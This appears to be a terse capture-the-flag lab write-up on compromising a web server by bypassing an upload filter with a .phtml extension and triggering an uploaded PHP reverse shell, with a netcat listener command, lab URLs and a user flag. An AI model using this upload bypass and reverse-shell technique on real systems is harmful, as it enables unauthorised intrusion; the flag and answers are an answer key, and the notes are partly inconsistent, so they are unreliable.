# Task 4: Compromise the webserver

  
  
  
1. Try upload a few file types to the server, what common extension seems to be blocked?  
.php  
  
  
3. Run this attack, what extension is allowed?  
.phtml  
  
nc -lvnp 1234  
  
<http://10.10.186.245:3333/internal/uploads/php-reverse-shell.phtml>  
  
[http://10.10.151.122:3333/internal](http://10.10.186.245:3333/internal/uploads/php-reverse-shell.phtml)  
  
[http://10.10.151.122:3333/internal/uploads/php-reverse-shell.phtml](http://10.10.186.245:3333/internal/uploads/php-reverse-shell.phtml)  
  
whoami - www-data  
  
  
5. What user was running the web server?  
bill  
  
6. What is the user flag?  
8bd7992fbe8a6ad22a63361004cfcedb